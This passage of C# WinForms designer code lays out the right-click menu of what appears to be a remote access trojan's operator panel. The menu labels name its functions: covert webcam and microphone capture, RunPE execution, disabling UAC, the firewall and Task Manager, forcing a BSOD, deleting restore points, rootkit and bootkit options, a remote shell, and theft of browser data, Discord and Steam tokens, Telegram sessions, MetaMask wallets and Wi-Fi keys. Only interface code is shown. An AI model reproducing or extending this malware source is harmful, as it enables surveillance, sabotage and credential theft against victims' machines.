				this.Extra2ToolStripMenuItem1,
				this.ClientToolStripMenuItem1,
				this.ClientFolderToolStripMenuItem
			});
			this.Guna2ContextMenuStrip3.Name = "Guna2ContextMenuStrip2";
			this.Guna2ContextMenuStrip3.RenderStyle.ArrowColor = global::System.Drawing.Color.FromArgb(151, 143, 255);
			this.Guna2ContextMenuStrip3.RenderStyle.BorderColor = global::System.Drawing.Color.Gainsboro;
			this.Guna2ContextMenuStrip3.RenderStyle.ColorTable = null;
			this.Guna2ContextMenuStrip3.RenderStyle.RoundedEdges = true;
			this.Guna2ContextMenuStrip3.RenderStyle.SelectionArrowColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip3.RenderStyle.SelectionBackColor = global::System.Drawing.Color.FromArgb(113, 74, 250);
			this.Guna2ContextMenuStrip3.RenderStyle.SelectionForeColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip3.RenderStyle.SeparatorColor = global::System.Drawing.Color.Gainsboro;
			this.Guna2ContextMenuStrip3.RenderStyle.TextRenderingHint = global::System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
			this.Guna2ContextMenuStrip3.Size = new global::System.Drawing.Size(191, 664);
			this.InformationToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.InformationToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("InformationToolStripMenuItem1.Image");
			this.InformationToolStripMenuItem1.Name = "InformationToolStripMenuItem1";
			this.InformationToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.InformationToolStripMenuItem1.Text = "[ Information ]";
			this.MonitorToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.MonitorToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("MonitorToolStripMenuItem.Image");
			this.MonitorToolStripMenuItem.Name = "MonitorToolStripMenuItem";
			this.MonitorToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.MonitorToolStripMenuItem.Text = "[ Monitor ]";
			this.RunFileToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.RunFileToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.DiskToolStripMenuItem,
				this.LinkToolStripMenuItem,
				this.MemoryToolStripMenuItem1,
				this.RunPEToolStripMenuItem2
			});
			this.RunFileToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RunFileToolStripMenuItem.Image");
			this.RunFileToolStripMenuItem.Name = "RunFileToolStripMenuItem";
			this.RunFileToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.RunFileToolStripMenuItem.Text = "[ Run File ]";
			this.DiskToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.DiskToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("DiskToolStripMenuItem.Image");
			this.DiskToolStripMenuItem.Name = "DiskToolStripMenuItem";
			this.DiskToolStripMenuItem.Size = new global::System.Drawing.Size(133, 22);
			this.DiskToolStripMenuItem.Text = "[ Disk ]";
			this.LinkToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.LinkToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("LinkToolStripMenuItem.Image");
			this.LinkToolStripMenuItem.Name = "LinkToolStripMenuItem";
			this.LinkToolStripMenuItem.Size = new global::System.Drawing.Size(133, 22);
			this.LinkToolStripMenuItem.Text = "[ Link ]";
			this.MemoryToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.MemoryToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("MemoryToolStripMenuItem1.Image");
			this.MemoryToolStripMenuItem1.Name = "MemoryToolStripMenuItem1";
			this.MemoryToolStripMenuItem1.Size = new global::System.Drawing.Size(133, 22);
			this.MemoryToolStripMenuItem1.Text = "[ Memory ]";
			this.RunPEToolStripMenuItem2.BackColor = global::System.Drawing.Color.White;
			this.RunPEToolStripMenuItem2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RunPEToolStripMenuItem2.Image");
			this.RunPEToolStripMenuItem2.Name = "RunPEToolStripMenuItem2";
			this.RunPEToolStripMenuItem2.Size = new global::System.Drawing.Size(133, 22);
			this.RunPEToolStripMenuItem2.Text = "[ RunPE ]";
			this.WebCamToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.WebCamToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("WebCamToolStripMenuItem1.Image");
			this.WebCamToolStripMenuItem1.Name = "WebCamToolStripMenuItem1";
			this.WebCamToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.WebCamToolStripMenuItem1.Text = "[ WebCam ]";
			this.MicrophoneToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.MicrophoneToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("MicrophoneToolStripMenuItem1.Image");
			this.MicrophoneToolStripMenuItem1.Name = "MicrophoneToolStripMenuItem1";
			this.MicrophoneToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.MicrophoneToolStripMenuItem1.Text = "[ Microphone ]";
			this.SystemSoundToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.SystemSoundToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("SystemSoundToolStripMenuItem1.Image");
			this.SystemSoundToolStripMenuItem1.Name = "SystemSoundToolStripMenuItem1";
			this.SystemSoundToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.SystemSoundToolStripMenuItem1.Text = "[ System Sound ]";
			this.OpenUrlToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.OpenUrlToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.VisibleToolStripMenuItem1,
				this.InvisibleToolStripMenuItem1
			});
			this.OpenUrlToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("OpenUrlToolStripMenuItem1.Image");
			this.OpenUrlToolStripMenuItem1.Name = "OpenUrlToolStripMenuItem1";
			this.OpenUrlToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.OpenUrlToolStripMenuItem1.Text = "[ Open Url ]";
			this.VisibleToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.VisibleToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("VisibleToolStripMenuItem1.Image");
			this.VisibleToolStripMenuItem1.Name = "VisibleToolStripMenuItem1";
			this.VisibleToolStripMenuItem1.Size = new global::System.Drawing.Size(131, 22);
			this.VisibleToolStripMenuItem1.Text = "[ Visible ]";
			this.InvisibleToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.InvisibleToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("InvisibleToolStripMenuItem1.Image");
			this.InvisibleToolStripMenuItem1.Name = "InvisibleToolStripMenuItem1";
			this.InvisibleToolStripMenuItem1.Size = new global::System.Drawing.Size(131, 22);
			this.InvisibleToolStripMenuItem1.Text = "[ Invisible ]";
			this.OptionsToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.OptionsToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.BlankScreenToolStripMenuItem1,
				this.RegeditToolStripMenuItem1,
				this.FirewallToolStripMenuItem1,
				this.TaskMgrToolStripMenuItem1,
				this.UACToolStripMenuItem1,
				this.UpdateToolStripMenuItem2,
				this.ResetScaleToolStripMenuItem1,
				this.InvokeBSODToolStripMenuItem1,
				this.DeleteRestoreToolStripMenuItem1,
				this.Net35InstallToolStripMenuItem1,
				this.UninstallPluginsToolStripMenuItem
			});
			this.OptionsToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("OptionsToolStripMenuItem.Image");
			this.OptionsToolStripMenuItem.Name = "OptionsToolStripMenuItem";
			this.OptionsToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.OptionsToolStripMenuItem.Text = "[ Options ]";
			this.BlankScreenToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.BlankScreenToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.EnableToolStripMenuItem6,
				this.DisableToolStripMenuItem6
			});
			this.BlankScreenToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("BlankScreenToolStripMenuItem1.Image");
			this.BlankScreenToolStripMenuItem1.Name = "BlankScreenToolStripMenuItem1";
			this.BlankScreenToolStripMenuItem1.Size = new global::System.Drawing.Size(170, 22);
			this.BlankScreenToolStripMenuItem1.Text = "[ BlankScreen ]";
			this.EnableToolStripMenuItem6.BackColor = global::System.Drawing.Color.White;
			this.EnableToolStripMenuItem6.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("EnableToolStripMenuItem6.Image");
			this.EnableToolStripMenuItem6.Name = "EnableToolStripMenuItem6";
			this.EnableToolStripMenuItem6.Size = new global::System.Drawing.Size(126, 22);
			this.EnableToolStripMenuItem6.Text = "[ Enable ]";
			this.DisableToolStripMenuItem6.BackColor = global::System.Drawing.Color.White;
			this.DisableToolStripMenuItem6.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("DisableToolStripMenuItem6.Image");
			this.DisableToolStripMenuItem6.Name = "DisableToolStripMenuItem6";
			this.DisableToolStripMenuItem6.Size = new global::System.Drawing.Size(126, 22);
			this.DisableToolStripMenuItem6.Text = "[ Disable ]";
			this.RegeditToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.RegeditToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.EnableToolStripMenuItem8,
				this.DisableToolStripMenuItem8
			});
			this.RegeditToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RegeditToolStripMenuItem1.Image");
			this.RegeditToolStripMenuItem1.Name = "RegeditToolStripMenuItem1";
			this.RegeditToolStripMenuItem1.Size = new global::System.Drawing.Size(170, 22);
			this.RegeditToolStripMenuItem1.Text = "[ Regedit ]";
			this.EnableToolStripMenuItem8.BackColor = global::System.Drawing.Color.White;
			this.EnableToolStripMenuItem8.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("EnableToolStripMenuItem8.Image");
			this.EnableToolStripMenuItem8.Name = "EnableToolStripMenuItem8";
			this.EnableToolStripMenuItem8.Size = new global::System.Drawing.Size(126, 22);
			this.EnableToolStripMenuItem8.Text = "[ Enable ]";
			this.DisableToolStripMenuItem8.BackColor = global::System.Drawing.Color.White;
			this.DisableToolStripMenuItem8.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("DisableToolStripMenuItem8.Image");
			this.DisableToolStripMenuItem8.Name = "DisableToolStripMenuItem8";
			this.DisableToolStripMenuItem8.Size = new global::System.Drawing.Size(126, 22);
			this.DisableToolStripMenuItem8.Text = "[ Disable ]";
			this.FirewallToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.FirewallToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.EnableToolStripMenuItem10,
				this.DisableToolStripMenuItem10
			});
			this.FirewallToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("FirewallToolStripMenuItem1.Image");
			this.FirewallToolStripMenuItem1.Name = "FirewallToolStripMenuItem1";
			this.FirewallToolStripMenuItem1.Size = new global::System.Drawing.Size(170, 22);
			this.FirewallToolStripMenuItem1.Text = "[ Firewall ]";
			this.EnableToolStripMenuItem10.BackColor = global::System.Drawing.Color.White;
			this.EnableToolStripMenuItem10.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("EnableToolStripMenuItem10.Image");
			this.EnableToolStripMenuItem10.Name = "EnableToolStripMenuItem10";
			this.EnableToolStripMenuItem10.Size = new global::System.Drawing.Size(126, 22);
			this.EnableToolStripMenuItem10.Text = "[ Enable ]";
			this.DisableToolStripMenuItem10.BackColor = global::System.Drawing.Color.White;
			this.DisableToolStripMenuItem10.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("DisableToolStripMenuItem10.Image");
			this.DisableToolStripMenuItem10.Name = "DisableToolStripMenuItem10";
			this.DisableToolStripMenuItem10.Size = new global::System.Drawing.Size(126, 22);
			this.DisableToolStripMenuItem10.Text = "[ Disable ]";
			this.TaskMgrToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.TaskMgrToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.EnableToolStripMenuItem9,
				this.DisableToolStripMenuItem9
			});
			this.TaskMgrToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("TaskMgrToolStripMenuItem1.Image");
			this.TaskMgrToolStripMenuItem1.Name = "TaskMgrToolStripMenuItem1";
			this.TaskMgrToolStripMenuItem1.Size = new global::System.Drawing.Size(170, 22);
			this.TaskMgrToolStripMenuItem1.Text = "[ TaskMgr ]";
			this.EnableToolStripMenuItem9.BackColor = global::System.Drawing.Color.White;
			this.EnableToolStripMenuItem9.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("EnableToolStripMenuItem9.Image");
			this.EnableToolStripMenuItem9.Name = "EnableToolStripMenuItem9";
			this.EnableToolStripMenuItem9.Size = new global::System.Drawing.Size(126, 22);
			this.EnableToolStripMenuItem9.Text = "[ Enable ]";
			this.DisableToolStripMenuItem9.BackColor = global::System.Drawing.Color.White;
			this.DisableToolStripMenuItem9.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("DisableToolStripMenuItem9.Image");
			this.DisableToolStripMenuItem9.Name = "DisableToolStripMenuItem9";
			this.DisableToolStripMenuItem9.Size = new global::System.Drawing.Size(126, 22);
			this.DisableToolStripMenuItem9.Text = "[ Disable ]";
			this.UACToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.UACToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.EnableToolStripMenuItem7,
				this.DisableToolStripMenuItem7
			});
			this.UACToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("UACToolStripMenuItem1.Image");
			this.UACToolStripMenuItem1.Name = "UACToolStripMenuItem1";
			this.UACToolStripMenuItem1.Size = new global::System.Drawing.Size(170, 22);
			this.UACToolStripMenuItem1.Text = "[ UAC ]";
			this.EnableToolStripMenuItem7.BackColor = global::System.Drawing.Color.White;
			this.EnableToolStripMenuItem7.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("EnableToolStripMenuItem7.Image");
			this.EnableToolStripMenuItem7.Name = "EnableToolStripMenuItem7";
			this.EnableToolStripMenuItem7.Size = new global::System.Drawing.Size(126, 22);
			this.EnableToolStripMenuItem7.Text = "[ Enable ]";
			this.DisableToolStripMenuItem7.BackColor = global::System.Drawing.Color.White;
			this.DisableToolStripMenuItem7.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("DisableToolStripMenuItem7.Image");
			this.DisableToolStripMenuItem7.Name = "DisableToolStripMenuItem7";
			this.DisableToolStripMenuItem7.Size = new global::System.Drawing.Size(126, 22);
			this.DisableToolStripMenuItem7.Text = "[ Disable ]";
			this.UpdateToolStripMenuItem2.BackColor = global::System.Drawing.Color.White;
			this.UpdateToolStripMenuItem2.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.EnableToolStripMenuItem11,
				this.DisableToolStripMenuItem11
			});
			this.UpdateToolStripMenuItem2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("UpdateToolStripMenuItem2.Image");
			this.UpdateToolStripMenuItem2.Name = "UpdateToolStripMenuItem2";
			this.UpdateToolStripMenuItem2.Size = new global::System.Drawing.Size(170, 22);
			this.UpdateToolStripMenuItem2.Text = "[ Update ]";
			this.EnableToolStripMenuItem11.BackColor = global::System.Drawing.Color.White;
			this.EnableToolStripMenuItem11.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("EnableToolStripMenuItem11.Image");
			this.EnableToolStripMenuItem11.Name = "EnableToolStripMenuItem11";
			this.EnableToolStripMenuItem11.Size = new global::System.Drawing.Size(126, 22);
			this.EnableToolStripMenuItem11.Text = "[ Enable ]";
			this.DisableToolStripMenuItem11.BackColor = global::System.Drawing.Color.White;
			this.DisableToolStripMenuItem11.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("DisableToolStripMenuItem11.Image");
			this.DisableToolStripMenuItem11.Name = "DisableToolStripMenuItem11";
			this.DisableToolStripMenuItem11.Size = new global::System.Drawing.Size(126, 22);
			this.DisableToolStripMenuItem11.Text = "[ Disable ]";
			this.ResetScaleToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.ResetScaleToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ResetScaleToolStripMenuItem1.Image");
			this.ResetScaleToolStripMenuItem1.Name = "ResetScaleToolStripMenuItem1";
			this.ResetScaleToolStripMenuItem1.Size = new global::System.Drawing.Size(170, 22);
			this.ResetScaleToolStripMenuItem1.Text = "[ ResetScale ]";
			this.InvokeBSODToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.InvokeBSODToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("InvokeBSODToolStripMenuItem1.Image");
			this.InvokeBSODToolStripMenuItem1.Name = "InvokeBSODToolStripMenuItem1";
			this.InvokeBSODToolStripMenuItem1.Size = new global::System.Drawing.Size(170, 22);
			this.InvokeBSODToolStripMenuItem1.Text = "[ InvokeBSOD ]";
			this.DeleteRestoreToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.DeleteRestoreToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("DeleteRestoreToolStripMenuItem1.Image");
			this.DeleteRestoreToolStripMenuItem1.Name = "DeleteRestoreToolStripMenuItem1";
			this.DeleteRestoreToolStripMenuItem1.Size = new global::System.Drawing.Size(170, 22);
			this.DeleteRestoreToolStripMenuItem1.Text = "[ DeleteRestore ]";
			this.Net35InstallToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.Net35InstallToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("Net35InstallToolStripMenuItem1.Image");
			this.Net35InstallToolStripMenuItem1.Name = "Net35InstallToolStripMenuItem1";
			this.Net35InstallToolStripMenuItem1.Size = new global::System.Drawing.Size(170, 22);
			this.Net35InstallToolStripMenuItem1.Text = "[ .Net 3.5 Install ]";
			this.UninstallPluginsToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.UninstallPluginsToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("UninstallPluginsToolStripMenuItem.Image");
			this.UninstallPluginsToolStripMenuItem.Name = "UninstallPluginsToolStripMenuItem";
			this.UninstallPluginsToolStripMenuItem.Size = new global::System.Drawing.Size(170, 22);
			this.UninstallPluginsToolStripMenuItem.Text = "[ RemovePlugins ]";
			this.ShellToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.ShellToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ShellToolStripMenuItem.Image");
			this.ShellToolStripMenuItem.Name = "ShellToolStripMenuItem";
			this.ShellToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.ShellToolStripMenuItem.Text = "[ Shell ]";
			this.KitToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.KitToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.ToolStripMenuItem1,
				this.ToolStripMenuItem2
			});
			this.KitToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("KitToolStripMenuItem1.Image");
			this.KitToolStripMenuItem1.Name = "KitToolStripMenuItem1";
			this.KitToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.KitToolStripMenuItem1.Text = "Kit";
			this.ToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.ToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ToolStripMenuItem1.Image");
			this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
			this.ToolStripMenuItem1.Size = new global::System.Drawing.Size(113, 22);
			this.ToolStripMenuItem1.Text = "RootKit";
			this.ToolStripMenuItem2.BackColor = global::System.Drawing.Color.White;
			this.ToolStripMenuItem2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ToolStripMenuItem2.Image");
			this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
			this.ToolStripMenuItem2.Size = new global::System.Drawing.Size(113, 22);
			this.ToolStripMenuItem2.Text = "BootKit";
			this.FileManagerToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.FileManagerToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("FileManagerToolStripMenuItem1.Image");
			this.FileManagerToolStripMenuItem1.Name = "FileManagerToolStripMenuItem1";
			this.FileManagerToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.FileManagerToolStripMenuItem1.Text = "[ File Manager ]";
			this.RecoveryOptionsToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.RecoveryOptionsToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.V20TwoToolStripMenuItem3,
				this.RunRecoveryToolStripMenuItem,
				this.SteamTokennToolStripMenuItem3,
				this.ChromiumToolStripMenuItem,
				this.DiscordTokenToolStripMenuItem,
				this.TelegramSessionToolStripMenuItem,
				this.ProductKeyToolStripMenuItem1,
				this.MetaMaskToolStripMenuItem1,
				this.FileZillaToolStripMenuItem1,
				this.WifiKeysToolStripMenuItem1
			});
			this.RecoveryOptionsToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RecoveryOptionsToolStripMenuItem.Image");
			this.RecoveryOptionsToolStripMenuItem.Name = "RecoveryOptionsToolStripMenuItem";
			this.RecoveryOptionsToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.RecoveryOptionsToolStripMenuItem.Text = "[ Recovery Options ]";
			this.V20TwoToolStripMenuItem3.BackColor = global::System.Drawing.Color.White;
			this.V20TwoToolStripMenuItem3.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("V20TwoToolStripMenuItem3.Image");
			this.V20TwoToolStripMenuItem3.Name = "V20TwoToolStripMenuItem3";
			this.V20TwoToolStripMenuItem3.Size = new global::System.Drawing.Size(175, 22);
			this.V20TwoToolStripMenuItem3.Text = "[ V20Recovery ]";
			this.RunRecoveryToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.RunRecoveryToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RunRecoveryToolStripMenuItem.Image");
			this.RunRecoveryToolStripMenuItem.Name = "RunRecoveryToolStripMenuItem";
			this.RunRecoveryToolStripMenuItem.Size = new global::System.Drawing.Size(175, 22);
			this.RunRecoveryToolStripMenuItem.Text = "[ RunRecovery ]";
			this.SteamTokennToolStripMenuItem3.BackColor = global::System.Drawing.Color.White;
			this.SteamTokennToolStripMenuItem3.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("SteamTokennToolStripMenuItem3.Image");
			this.SteamTokennToolStripMenuItem3.Name = "SteamTokennToolStripMenuItem3";
			this.SteamTokennToolStripMenuItem3.Size = new global::System.Drawing.Size(175, 22);
			this.SteamTokennToolStripMenuItem3.Text = "[ Steam Token ]";
			this.ChromiumToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.ChromiumToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ChromiumToolStripMenuItem.Image");
			this.ChromiumToolStripMenuItem.Name = "ChromiumToolStripMenuItem";
			this.ChromiumToolStripMenuItem.Size = new global::System.Drawing.Size(175, 22);
			this.ChromiumToolStripMenuItem.Text = "[ Chromium ]";
			this.DiscordTokenToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.DiscordTokenToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("DiscordTokenToolStripMenuItem.Image");
			this.DiscordTokenToolStripMenuItem.Name = "DiscordTokenToolStripMenuItem";
			this.DiscordTokenToolStripMenuItem.Size = new global::System.Drawing.Size(175, 22);
			this.DiscordTokenToolStripMenuItem.Text = "[ DiscordToken ]";
			this.TelegramSessionToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.TelegramSessionToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("TelegramSessionToolStripMenuItem.Image");
			this.TelegramSessionToolStripMenuItem.Name = "TelegramSessionToolStripMenuItem";
			this.TelegramSessionToolStripMenuItem.Size = new global::System.Drawing.Size(175, 22);
			this.TelegramSessionToolStripMenuItem.Text = "[ TelegramSession ]";
			this.ProductKeyToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.ProductKeyToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ProductKeyToolStripMenuItem1.Image");
			this.ProductKeyToolStripMenuItem1.Name = "ProductKeyToolStripMenuItem1";
			this.ProductKeyToolStripMenuItem1.Size = new global::System.Drawing.Size(175, 22);
			this.ProductKeyToolStripMenuItem1.Text = "[ ProductKey ]";
			this.MetaMaskToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.MetaMaskToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("MetaMaskToolStripMenuItem1.Image");
			this.MetaMaskToolStripMenuItem1.Name = "MetaMaskToolStripMenuItem1";
			this.MetaMaskToolStripMenuItem1.Size = new global::System.Drawing.Size(175, 22);
			this.MetaMaskToolStripMenuItem1.Text = "[ MetaMask ]";
			this.FileZillaToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.FileZillaToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("FileZillaToolStripMenuItem1.Image");
			this.FileZillaToolStripMenuItem1.Name = "FileZillaToolStripMenuItem1";
			this.FileZillaToolStripMenuItem1.Size = new global::System.Drawing.Size(175, 22);
			this.FileZillaToolStripMenuItem1.Text = "[ FileZilla ]";
			this.WifiKeysToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.WifiKeysToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("WifiKeysToolStripMenuItem1.Image");
			this.WifiKeysToolStripMenuItem1.Name = "WifiKeysToolStripMenuItem1";
			this.WifiKeysToolStripMenuItem1.Size = new global::System.Drawing.Size(175, 22);
			this.WifiKeysToolStripMenuItem1.Text = "[ Wifi Keys ]";
			this.RegistryEditorToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.RegistryEditorToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RegistryEditorToolStripMenuItem1.Image");
			this.RegistryEditorToolStripMenuItem1.Name = "RegistryEditorToolStripMenuItem1";
			this.RegistryEditorToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.RegistryEditorToolStripMenuItem1.Text = "[ Registry Editor ]";
			this.ActiveWindowsToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.ActiveWindowsToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ActiveWindowsToolStripMenuItem1.Image");
			this.ActiveWindowsToolStripMenuItem1.Name = "ActiveWindowsToolStripMenuItem1";
			this.ActiveWindowsToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.ActiveWindowsToolStripMenuItem1.Text = "[ ActiveWindows ]";
			this.TCPConnectionsToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.TCPConnectionsToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("TCPConnectionsToolStripMenuItem.Image");
			this.TCPConnectionsToolStripMenuItem.Name = "TCPConnectionsToolStripMenuItem";
			this.TCPConnectionsToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.TCPConnectionsToolStripMenuItem.Text = "[ TCP Connections ]";
			this.StartupManagerToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.StartupManagerToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("StartupManagerToolStripMenuItem1.Image");
			this.StartupManagerToolStripMenuItem1.Name = "StartupManagerToolStripMenuItem1";
			this.StartupManagerToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.StartupManagerToolStripMenuItem1.Text = "[ StartupManager ]";
			this.ProcessManagerToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.ProcessManagerToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ProcessManagerToolStripMenuItem1.Image");
			this.ProcessManagerToolStripMenuItem1.Name = "ProcessManagerToolStripMenuItem1";
			this.ProcessManagerToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.ProcessManagerToolStripMenuItem1.Text = "[ Process Manager ]";
			this.ServiceManagerToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.ServiceManagerToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ServiceManagerToolStripMenuItem1.Image");
			this.ServiceManagerToolStripMenuItem1.Name = "ServiceManagerToolStripMenuItem1";
			this.ServiceManagerToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.ServiceManagerToolStripMenuItem1.Text = "[ Service Manager ]";
			this.ClipboardManagerToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
